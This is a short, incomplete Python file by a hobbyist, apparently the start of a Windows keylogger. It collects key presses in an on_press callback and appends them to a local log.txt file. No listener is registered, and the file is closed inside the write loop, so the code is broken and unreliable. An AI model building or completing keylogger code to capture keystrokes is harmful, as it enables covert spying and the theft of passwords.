# Author: Aleksa

# PATH UPDATED

import os
import time

# KEY LOGS STORAGE FILE
keys_log = "log.txt"
path = "C:\\Users\\Korisnik\\Official\\Desktop\\Coding\\klog"

count = 0
keys = []

def on_press(key):

  global keys, count
  
  keys.append(key)
  count += 1

def write_to_log(keys):
  with open(path + "\\" + keys_log, "a") as file_:
    for key in keys:
      k = str(key).replace("'", "") # REPLACE '' WITH EMPTY SPACE

      # MAKE WORDS (FORMAT THE OUTPUT LOG)
      if k.find("space") > 0:
        file_.write('\n')
        file_.close()
